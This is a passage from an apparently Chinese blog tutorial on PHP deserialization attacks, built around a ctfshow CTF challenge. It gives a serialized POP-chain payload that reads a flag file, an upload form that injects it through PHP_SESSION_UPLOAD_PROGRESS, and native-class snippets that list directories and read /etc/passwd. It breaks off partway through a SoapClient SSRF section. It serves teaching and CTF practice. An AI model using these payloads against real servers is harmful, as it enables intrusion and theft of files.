src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-3.png"></p><blockquote><p>总结：由于1.php是使用php_serialize引擎处理，因此只会把’|’当做一个正常的字符。然后访问2.php，由于用的是php引擎，因此遇到’|’时会将之看做键名与值的分割符，从而造成了歧义，导致其在解析session文件时直接对’|’后的值进行反序列化处理。</p></blockquote><h2 id="SESSION变量不可控"><a href="#SESSION变量不可控" class="headerlink" title="$_SESSION变量不可控"></a>$_SESSION变量不可控</h2><p>当<code>$_SESSION</code>不能直接控制时，可以借助<code>PHP_SESSION_UPLOAD_PROGRESS</code>来完成反序列化</p><p>关于<code>PHP_SESSION_UPLOAD_PROGRESS</code>的介绍可以参考我的另一篇文章<a href="https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93.html#session-upload-progress%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">session.upload_progress文件包含</a></p><p>这里用ctfshow的一道新春题的前半部分作例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;class.php&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;session.serialize_handler&quot;</span>, <span class="hljs-string">&quot;php&quot;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;phpinfo&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">phpinfo</span>();<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;class.php&quot;</span>);<br>&#125;<br><br><span class="hljs-variable">$happy</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Happy</span>();<br><span class="hljs-variable">$happy</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Happy</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$happy</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;happy=<span class="hljs-string">&quot;Happy_New_Year!!!&quot;</span>;<br><br>        &#125;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;happy-&gt;happy;<br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$funName</span>, <span class="hljs-variable">$arguments</span></span>)</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-variable language_">$this</span>-&gt;happy-&gt;<span class="hljs-variable">$funName</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;happy-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;happy;<br>        &#125;<br><br><br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_New_</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$daniu</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$robot</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$notrobot</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$_New_</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;daniu=<span class="hljs-string">&quot;I&#x27;m daniu.&quot;</span>;<br>                <span class="hljs-variable language_">$this</span>-&gt;robot=<span class="hljs-string">&quot;I&#x27;m robot.&quot;</span>;<br>                <span class="hljs-variable language_">$this</span>-&gt;notrobot=<span class="hljs-string">&quot;I&#x27;m not a robot.&quot;</span>;<br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$funName</span>, <span class="hljs-variable">$arguments</span></span>)</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;daniu.<span class="hljs-variable">$funName</span>.<span class="hljs-string">&quot;not exists!!!&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;daniu;<br>            <span class="hljs-variable language_">$this</span>-&gt;daniu=<span class="hljs-variable language_">$this</span>-&gt;robot;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;daniu;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable">$robot</span>=<span class="hljs-variable language_">$this</span>-&gt;robot;<br>            <span class="hljs-variable language_">$this</span>-&gt;daniu-&gt;<span class="hljs-variable">$robot</span>=<span class="hljs-variable language_">$this</span>-&gt;notrobot;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;daniu;<br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>               <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;daniu.<span class="hljs-variable">$key</span>.<span class="hljs-string">&quot;not exists!!!&quot;</span>;<br>        &#125;<br><br> &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Year</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$zodiac</span>;<br>         <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;happy &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;zodiac.<span class="hljs-string">&quot; year!&quot;</span>;<br><br>        &#125;<br>         <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;zodiac=<span class="hljs-string">&quot;Hu&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">show</span>();<br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$value</span></span>)#3</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;zodiac));<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;zodiac = <span class="hljs-string">&#x27;hu&#x27;</span>;<br>        &#125;<br><br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>先构造pop链<br><code>O:5:&quot;Happy&quot;:1:&#123;s:5:&quot;happy&quot;;O:5:&quot;_New_&quot;:3:&#123;s:5:&quot;daniu&quot;;O:5:&quot;_New_&quot;:3:&#123;s:5:&quot;daniu&quot;;O:4:&quot;Year&quot;:1:&#123;s:6:&quot;zodiac&quot;;N;&#125;s:5:&quot;robot&quot;;s:6:&quot;zodiac&quot;;s:8:&quot;notrobot&quot;;s:5:&quot;/f1ag&quot;;&#125;s:5:&quot;robot&quot;;N;s:8:&quot;notrobot&quot;;N;&#125;&#125;</code></p><p>看下phpinfo中关于session的信息，可以知道当前index.php用的是<code>php</code>引擎，其他页面默认用<code>php_serialize</code>引擎，且<code>session.upload_progress.cleanup=Off</code>，意味着php不会立即清空对应的session文件，就不用进行条件竞争</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-4.png"></p><p>构造<code>POST</code>表单，提交传入序列化字符串</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://dece2f58-5f4b-4bd0-904a-ac58efcf9623.challenges.ctfer.com:8080/&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;lewiserii&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p>因为要放到<code>filename</code>中的双引号中，所以这里要转义一下双引号，在拼接上<code>|</code>，注意一定要带上<code>PHPSESSID</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-5.png"></p><blockquote><p>伪造PHP_SESSION_UPLOAD_PROGRESS的值时，值中一旦出现|，将会导致数据写入session文件失败，所以用filename</p></blockquote><h1 id="php原生类反序列化"><a href="#php原生类反序列化" class="headerlink" title="php原生类反序列化"></a>php原生类反序列化</h1><p>如果在代码审计中有反序列化点，但在代码中找不到pop链，可以利用php内置类来进行反序列化</p><h2 id="原生文件操作类"><a href="#原生文件操作类" class="headerlink" title="原生文件操作类"></a>原生文件操作类</h2><p><strong>可遍历目录类：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">DirectoryIterator</span> 类<br><span class="hljs-built_in">FilesystemIterator</span> 类<br><span class="hljs-built_in">GlobIterator</span> 类<br></code></pre></td></tr></table></figure><p>FilesystemIterator 类与 DirectoryIterator 类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。</p><p>GlobIterator 类与前两个类的作用与使用方法相似，但与上面略不同的是其行为类似于glob()，可以通过模式匹配来寻找文件路径。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;/&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br><br><span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">&quot;/&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br><br><span class="hljs-comment">//也可以与glob://协议配合使用来查找文件</span><br><span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*flag*&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br><br><span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">&quot;glob:///*flag*&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br><br><span class="hljs-comment">//GlobIterator无需借助glob协议即可搜索全局文件</span><br><span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">GlobIterator</span>(<span class="hljs-string">&quot;/*flag*&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br></code></pre></td></tr></table></figure><p><strong>可读取文件类</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">SplFileObject</span> 类<br></code></pre></td></tr></table></figure><p>SplFileInfo 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//读取一个文件的一行</span><br><span class="hljs-variable">$context</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$context</span>;<br><br><span class="hljs-comment">//读取多行需要遍历或者使用伪协议</span><br><span class="hljs-variable">$context</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$context</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>);<br>&#125;<br><br><span class="hljs-variable">$context</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=/etc/passwd&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$context</span>;<br></code></pre></td></tr></table></figure><h2 id="SoapClient反序列化与ssrf"><a href="#SoapClient反序列化与ssrf" class="headerlink" title="SoapClient反序列化与ssrf"></a>SoapClient反序列化与ssrf</h2><p>首先需要了解什么是soap<br>soap，是webService三要素(SOAP、WSDL、UDDI)之一</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">SOAP: 基于HTTP协议，采用XML格式，用来描述传递信息的格式。<br><br>WSDL: 用来描述如何访问具体的服务。（相当于说明书）<br><br>UDDI: 用户自己可以按UDDI标准搭建UDDI服务器，用来管理，分发，查询WebService 。其他用户可以自己注册发布WebService调用。（现在基本废弃）<br></code></pre></td></tr></table></figure><p>简单来说就是soap是一种基于http的传输协议，可以发起请求来访问远程服务</p><p><a href="https://www.php.net/manual/zh/class.soapclient.php">php官方手册</a>中对soapclient的解释如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SoapClient</span> </span>&#123;<br><span class="hljs-comment">/* 属性 */</span><br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$uri</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">int</span> <span class="hljs-variable">$style</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">int</span> <span class="hljs-variable">$use</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$location</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">bool</span> <span class="hljs-variable">$trace</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">int</span> <span class="hljs-variable">$compression</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?resource <span class="hljs-variable">$sdl</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?resource <span class="hljs-variable">$typemap</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?resource <span class="hljs-variable">$httpsocket</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?resource <span class="hljs-variable">$httpurl</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$_login</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$_password</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">bool</span> <span class="hljs-variable">$_use_digest</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$_digest</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$_proxy_host</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">int</span> <span class="hljs-variable">$_proxy_port</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$_proxy_login</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$_proxy_password</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">bool</span> <span class="hljs-variable">$_exceptions</span> = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$_encoding</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">array</span> <span class="hljs-variable">$_classmap</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">int</span> <span class="hljs-variable">$_features</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$_connection_timeout</span>;<br><span class="hljs-keyword">private</span> ?resource <span class="hljs-variable">$_stream_context</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$_user_agent</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">bool</span> <span class="hljs-variable">$_keep_alive</span> = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">int</span> <span class="hljs-variable">$_ssl_method</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$_soap_version</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">int</span> <span class="hljs-variable">$_use_proxy</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">array</span> <span class="hljs-variable">$_cookies</span> = [];<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">array</span> <span class="hljs-variable">$__default_headers</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?SoapFault <span class="hljs-variable">$__soap_fault</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$__last_request</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$__last_response</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$__last_request_headers</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$__last_response_headers</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-comment">/* 方法 */</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__construct</span>(?<span class="hljs-keyword">string</span> <span class="hljs-variable">$wsdl</span>, <span class="hljs-keyword">array</span> <span class="hljs-variable">$options</span> = [])<br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__call</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span>, <span class="hljs-keyword">array</span> <span class="hljs-variable">$args</span>): <span class="hljs-keyword">mixed</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__doRequest</span>(<br>    <span class="hljs-keyword">string</span> <span class="hljs-variable">$request</span>,<br>    <span class="hljs-keyword">string</span> <span class="hljs-variable">$location</span>,<br>    <span class="hljs-keyword">string</span> <span class="hljs-variable">$action</span>,<br>    <span class="hljs-keyword">int</span> <span class="hljs-variable">$version</span>,<br>    <span class="hljs-keyword">bool</span> <span class="hljs-variable">$oneWay</span> = <span class="hljs-literal">false</span><br>): ?<span class="hljs-keyword">string</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getCookies</span>(): <span class="hljs-keyword">array</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getFunctions</span>(): ?<span class="hljs-keyword">array</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getLastRequest</span>(): ?<span class="hljs-keyword">string</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getLastRequestHeaders</span>(): ?<span class="hljs-keyword">string</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getLastResponse</span>(): ?<span class="hljs-keyword">string</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getLastResponseHeaders</span>(): ?<span class="hljs-keyword">string</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getTypes</span>(): ?<span class="hljs-keyword">array</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__setCookie</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span>, ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$value</span> = <span class="hljs-literal">null</span>): <span class="hljs-keyword">void</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__setLocation</span>(?<span class="hljs-keyword">string</span> <span class="hljs-variable">$location</span> = <span class="hljs-literal">null</span>): ?<span class="hljs-keyword">string</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__setSoapHeaders</span>(SoapHeader|<span class="hljs-keyword">array</span>|<span class="hljs-literal">null</span> <span class="hljs-variable">$headers</span> = <span class="hljs-literal">null</span>): <span 